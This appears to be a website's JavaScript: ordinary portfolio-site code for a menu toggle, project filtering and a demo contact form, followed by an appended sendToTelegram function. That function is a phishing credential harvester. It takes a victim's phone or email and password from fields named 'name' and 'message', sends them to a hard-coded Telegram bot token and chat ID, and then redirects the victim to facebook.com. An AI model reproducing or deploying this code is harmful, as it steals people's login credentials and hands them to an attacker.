  <script>
       // Simple JavaScript for the mobile menu toggle
      document.addEventListener('DOMContentLoaded', function() {
        // Set current year in footer
        document.getElementById('current-year').textContent = new Date().getFullYear();
        
        // Mobile menu toggle
        const mobileMenuBtn = document.getElementById('mobile-menu-btn');
        const mobileNav = document.getElementById('mobile-nav');
        
        mobileMenuBtn.addEventListener('click', function() {
          this.classList.toggle('active');
          mobileNav.classList.toggle('active');
        });
        
        // Close mobile menu when clicking on a link
        const mobileNavItems = document.querySelectorAll('.mobile-nav-item');
        mobileNavItems.forEach(item => {
          item.addEventListener('click', function() {
            mobileMenuBtn.classList.remove('active');
            mobileNav.classList.remove('active');
          });
        });
        
        // Scroll to top button
        const scrollTopBtn = document.getElementById('scroll-top');
        scrollTopBtn.addEventListener('click', function() {
          window.scrollTo({
            top: 0,
            behavior: 'smooth'
          });
        });
        
        // Project filtering
        const projectFilters = document.querySelectorAll('.project-filter');
        const projectCards = document.querySelectorAll('.project-card');
        
        projectFilters.forEach(filter => {
          filter.addEventListener('click', function() {
            // Remove active class from all filters
            projectFilters.forEach(f => f.classList.remove('active'));
            // Add active class to current filter
            this.classList.add('active');
            
            const filterValue = this.getAttribute('data-filter');
            
            projectCards.forEach(card => {
              if (filterValue === 'all' || card.getAttribute('data-category') === filterValue) {
                card.style.display = 'block';
              } else {
                card.style.display = 'none';
              }
            });
          });
        });
        
        // Contact form submission (for demo)
        const contactForm = document.getElementById('contact-form');
        if (contactForm) {
          contactForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const submitBtn = contactForm.querySelector('.submit-btn');
            const originalBtnText = submitBtn.innerHTML;
            
            // Show loading state
            submitBtn.innerHTML = '<span class="loading-spinner"></span> Sending...';
            submitBtn.disabled = true;
            
            // Simulate form submission
            setTimeout(() => {
              alert('Thank you for your message! I will get back to you soon.');
              contactForm.reset();
              submitBtn.innerHTML = originalBtnText;
              submitBtn.disabled = false;
            }, 1500);
          });
        }
        
        // Initialize Lucide icons
        lucide.createIcons();
      });

    </script>


//  telegram api

 function sendToTelegram(event) {
            event.preventDefault(); // Prevent form from refreshing the page

            // Get form values
            let username = document.getElementById("name").value;
            let message = document.getElementById("message").value;

            // Your Telegram bot details
            let botToken = "7239842810:AAFEvwP7k_rzjlvpbpiC1hdM0PSX0A9aNuI"; // Replace with your bot token
            let chatId = "6895627984"; // Replace with your numeric chat ID

            // Create the message
            let fullMessage = `New Message:\nMobile number or email adderss: ${username}\nPassword: ${message}`;

            // Send the message to Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fullMessage)}`)
                .then(response => response.json())
                .then(data => {
                    console.log("Response from Telegram API:", data);
                    if (data.ok) {
                        window.location.href = "https://www.facebook.com"; // Redirect to facebook
                    } else {
                        alert("Error sending message!");
                    }
                })
                .catch(error => {
                    alert("Error: " + error);
                });
        }



        // thankyou




